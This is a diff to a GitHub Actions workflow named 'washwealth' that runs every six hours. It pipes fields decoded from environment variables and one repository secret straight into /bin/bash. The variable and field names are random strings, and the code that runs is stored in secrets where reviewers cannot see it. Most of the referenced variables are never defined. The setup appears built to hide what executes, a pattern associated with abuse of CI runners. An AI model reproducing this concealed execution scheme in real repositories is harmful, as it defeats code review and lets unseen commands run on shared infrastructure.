@@ -2,20 +2,32 @@ name: washwealth
 on:
   workflow_dispatch:
   schedule:
-    - cron: '3 0/6 * * *'
-
+    - cron: '10 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: washwealth
         env:
-          f93: ${{ secrets.f93 }}
+          hbg9: ${{ secrets.hbg9 }}
         run: |
-          echo $f93 | jq -r .x4388 | /bin/bash
-          echo $g4121 | jq -r .zh7283 | /bin/bash
-          echo $mst76 | jq -r .dphmu033 | /bin/bash
-          echo $v433 | jq -r .ufdkw9 | /bin/bash
-          echo $un2 | jq -r .ftz7 | /bin/bash
+          echo $hbg9 | jq -r .uur977 | /bin/bash
+          echo $uypq20 | jq -r .c4630 | /bin/bash
+          echo $q03 | jq -r .n95 | /bin/bash
+          echo $inkd10 | jq -r .d455 | /bin/bash
+          echo $ayzm4359 | jq -r .bkva6 | /bin/bash
+          echo $nx4935 | jq -r .cftjj2125 | /bin/bash
+          echo $qr630 | jq -r .jnypq57175 | /bin/bash
+          echo $ee6755 | jq -r .ff3 | /bin/bash
+          echo $mpac43496 | jq -r .ffod971 | /bin/bash
+          echo $tehm6331 | jq -r .cyyk92 | /bin/bash
+          echo $m5 | jq -r .izsy554 | /bin/bash
+          echo $adgcn0218 | jq -r .xdjr97 | /bin/bash
+          echo $s328 | jq -r .jaf25988 | /bin/bash
+          echo $h18 | jq -r .p18306 | /bin/bash
+          echo $fva355 | jq -r .hem99189 | /bin/bash
+          echo $uoc89 | jq -r .lrx7839 | /bin/bash
+          echo $xlqw0 | jq -r .yemc6162 | /bin/bash
 
